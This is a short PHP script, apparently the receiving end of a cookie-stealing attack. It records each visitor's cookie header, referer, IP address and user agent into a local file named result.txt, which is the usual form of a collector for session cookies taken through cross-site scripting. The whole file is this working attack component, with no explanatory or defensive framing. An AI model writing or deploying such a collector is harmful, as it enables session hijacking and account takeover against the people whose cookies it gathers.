<?php
$data = array(
    "cookie"        => $_SERVER['HTTP_COOKIE'], 
    "referer"       => $_SERVER['HTTP_REFERER'], 
    "remote_addr"   => $_SERVER['REMOTE_ADDR'], 
    "user_agent"    => $_SERVER['HTTP_USER_AGENT']
);

$open = fopen('result.txt', 'a+');
fwrite($open, implode("\r\n", $data)."\n\n");
fclose($open);
?>
